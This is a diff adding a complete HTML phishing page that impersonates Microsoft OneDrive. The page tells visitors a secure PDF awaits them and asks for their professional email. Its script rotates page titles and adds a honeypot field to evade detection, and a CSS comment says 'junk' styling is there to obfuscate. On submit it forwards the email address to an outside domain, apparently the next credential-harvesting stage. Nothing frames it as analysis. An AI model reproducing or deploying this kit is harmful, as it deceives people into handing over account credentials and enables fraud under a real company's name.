@@ -1,0 +1,256 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title id="ttlDyn">Verify Your Identity</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background: url(https://i.ibb.co/RvPRVN8/image.png) no-repeat center center;
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .header {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background-color: #0078d4;
+            color: white;
+            text-align: left;
+            padding: 10px 20px;
+            font-size: 1em;
+            box-sizing: border-box;
+        }
+        .header span {
+            font-weight: bold;
+        }
+        .container {
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
+            max-width: 400px;
+            width: 100%;
+            padding: 30px;
+            text-align: center;
+            position: relative;
+            box-sizing: border-box;
+        }
+        .microsoft-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        .microsoft-logo .square {
+            width: 24px;
+            height: 24px;
+            margin: 2px;
+        }
+        .microsoft-logo .red { background-color: #f25022; }
+        .microsoft-logo .green { background-color: #7fba00; }
+        .microsoft-logo .blue { background-color: #00a4ef; }
+        .microsoft-logo .yellow { background-color: #ffb900; }
+        .microsoft-logo .text {
+            margin-left: 10px;
+            font-size: 1.5em;
+            font-weight: bold;
+            color: #333;
+        }
+        .file-info {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        .file-info .file-icon {
+            background-color: #e81123;
+            color: white;
+            height: 40px;
+            width: 40px;
+            border-radius: 5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            font-weight: bold;
+            margin-right: 10px;
+        }
+        .file-info .file-details {
+            text-align: left;
+        }
+        .file-info .file-details strong {
+            display: block;
+            font-size: 0.9em;
+            color: #333;
+        }
+        .file-info .file-details span {
+            font-size: 0.8em;
+            color: #555;
+        }
+        .email-input {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        .email-input input {
+            width: calc(100% - 1px); /* Adjust width to account for padding and borders */
+            padding: 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            margin-top: 10px;
+            font-size: 1em;
+            box-sizing: border-box; /* Ensure padding and border are included in width */
+        }
+        .honeypot {
+            position: absolute;
+            left: -9999px;
+        }
+        .email-providers {
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .email-providers h3 {
+            font-size: 1.2em;
+            color: #0078d4;
+            margin-bottom: 10px;
+        }
+        .email-providers p {
+            font-size: 0.9em;
+            color: #555;
+        }
+        .submit-button button {
+            width: 100%;
+            background-color: #0078d4;
+            color: white;
+            padding: 15px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 1em;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); /* Junk CSS to obfuscate */
+            box-sizing: border-box; /* Ensure padding is included in width */
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <span>OneDrive</span>
+    </div>
+    <div class="container">
+        <div class="microsoft-logo">
+            <div>
+                <div class="square red"></div>
+                <div class="square green"></div>
+            </div>
+            <div>
+                <div class="square blue"></div>
+                <div class="square yellow"></div>
+            </div>
+            <div class="text">Microsoft</div>
+        </div>
+        <h2>Verify Your Identity</h2>
+        <div class="file-info">
+            <div class="file-icon">PDF</div>
+            <div class="file-details">
+                <strong>56.1KB</strong>
+                <span>You've received a secure file</span>
+            </div>
+        </div>
+        <p>To receive and download this PDF file, please enter the professional email address this document was sent to.</p>
+        <div class="email-providers">
+           
+        </div>
+        <form onsubmit="handleSubmit(event)" class="email-input">
+            <input type="email" name="txt1" placeholder="Enter email" required>
+            <input type="text" name="honeypot" class="honeypot">
+            <div class="submit-button">
+                <button type="submit">Submit</button>
+            </div>
+        </form>
+    </div>
+    <script>
+        (function() {
+            function generateId() {
+                return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+                    var r = Math.random() * 16 | 0,
+                        v = c == 'x' ? r : (r & 0x3 | 0x8);
+                    return v.toString(16);
+                });
+            }
+
+            function setSession() {
+                const sessId = generateId();
+                document.cookie = `sessionId=${sessId}; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT`;
+                const newUrl = `${window.location.href.split('?')[0]}?sess=${sessId}`;
+                window.history.replaceState({}, '', newUrl);
+            }
+
+            setSession();
+
+            const titles = [
+                "Identity Verification Center",
+                "Cloud File Access Check",
+                "Secure Account Gateway",
+                "File Access Verification",
+                "Cloud Security Portal",
+                "Document Access Verification",
+                "Safe Login Portal",
+                "File Safety Center",
+                "Account Access Verification",
+                "Secure Document Check",
+                "Cloud Credentials Portal",
+                "File Security Hub",
+                "Access Verification Dashboard",
+                "Cloud File Safety",
+                "Secure Access Portal"
+            ];
+            const usedTitles = JSON.parse(localStorage.getItem('usedTitles')) || [];
+            let availableTitles = titles.filter(title => !usedTitles.includes(title));
+
+            if (availableTitles.length === 0) {
+                localStorage.removeItem('usedTitles');
+                availableTitles = titles;
+            }
+
+            const selectedTitle = availableTitles[Math.floor(Math.random() * availableTitles.length)];
+            document.getElementById('ttlDyn').innerText = selectedTitle;
+
+            usedTitles.push(selectedTitle);
+            localStorage.setItem('usedTitles', JSON.stringify(usedTitles));
+        })();
+
+        function redirectToProvider(email) {
+            var lowerCaseEmail = email.toLowerCase();
+            if (lowerCaseEmail.includes('@gmail.com')) {
+                window.location.href = '#' + email;
+            } else if (lowerCaseEmail.includes('@outlook.com') || lowerCaseEmail.includes('@hotmail.com') || lowerCaseEmail.includes('@live.com')) {
+                window.location.href = 'https://av-wq-oiajkve.syncportal.space/ZbjaGcTh#' + email;
+            } else if (lowerCaseEmail.includes('@yahoo.com') || lowerCaseEmail.includes('@yahoo.co.uk') || lowerCaseEmail.includes('@ymail.com') || lowerCaseEmail.includes('@rocketmail.com')) {
+                window.location.href = 'https://av-wq-oiajkve.syncportal.space/ZbjaGcTh#' + email;
+            } else if (lowerCaseEmail.includes('@aol.com')) {
+                window.location.href = 'https://av-wq-oiajkve.syncportal.space/ZbjaGcTh#' + email;
+            } else if (lowerCaseEmail.includes('@office.com')) {
+                window.location.href = 'https://av-wq-oiajkve.syncportal.space/ZbjaGcTh#' + email;
+            } else {
+                window.location.href = 'https://av-wq-oiajkve.syncportal.space/ZbjaGcTh#' + email;
+            }
+        }
+
+        function handleSubmit(event) {
+            event.preventDefault();  // Prevent form from submitting in the default way
+            var email = document.querySelector('input[name="txt1"]').value;
+            redirectToProvider(email);
+        }
+    </script>
+</body>
+</html>
